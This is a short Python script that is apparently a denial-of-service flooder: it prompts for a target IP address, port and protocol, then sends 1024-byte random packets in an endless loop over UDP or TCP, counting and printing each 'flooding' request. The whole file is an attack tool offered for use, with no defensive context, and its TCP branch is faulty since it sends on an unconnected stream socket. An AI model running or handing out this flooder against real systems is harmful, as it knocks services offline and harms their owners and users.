import socket
import random

requests = 0
host = str(input("Enter the target's ip address: "))
port = int(input("Enter the port of the target: "))
conntype = str(input("Connection type(tcp/udp): "))
if conntype=="tcp" or conntype=="TCP":
    socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        while True:
            packet = random._urandom(1024)
            socket.sendto(packet,(host,int(port)))
            requests+=1 
            print(f"Flooding {requests} requests sent. CTRL + C to stop")
    except Exception as e:
        print(e)
        print("Wrong Input")

elif conntype=="udp" or conntype=="UDP":
    socket = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    try:
        while True:
            packet = random._urandom(1024)
            socket.sendto(packet,(host,int(port)))
            requests+=1
            print(f"Flooding {requests} requests sent. CTRL + C to stop")
    except Exception as e:
        print(e)
        print("Wrong Input!!")

